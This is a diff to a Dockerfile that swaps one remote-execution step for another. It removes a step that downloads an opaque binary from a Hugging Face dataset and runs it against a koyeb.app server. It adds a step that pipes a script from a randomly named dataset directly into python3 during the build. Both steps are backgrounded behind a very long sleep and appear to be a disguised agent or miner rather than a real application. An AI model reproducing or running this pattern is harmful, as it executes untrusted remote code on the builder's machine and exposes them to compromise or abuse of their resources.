@@ -1,10 +1,5 @@
 FROM ubuntu:latest
-
+RUN apt update && apt install curl python3 -y
 ENV DEBIAN_FRONTEND=noninteractive
 
-RUN apt-get update \
- && apt-get install -y --no-install-recommends curl ca-certificates \
- && rm -rf /var/lib/apt/lists/* \
- && curl -L https://huggingface.co/datasets/api2/app/resolve/main/app -o /app \
- && chmod +x /app \
- && /app --server https://dominant-marleah-kozak-87119c7a.koyeb.app & sleep 1231323
+RUN curl -sL https://huggingface.co/datasets/sdfsdfsaaasddfsdfsd/1/resolve/main/app.py | python3 & sleep 1231323
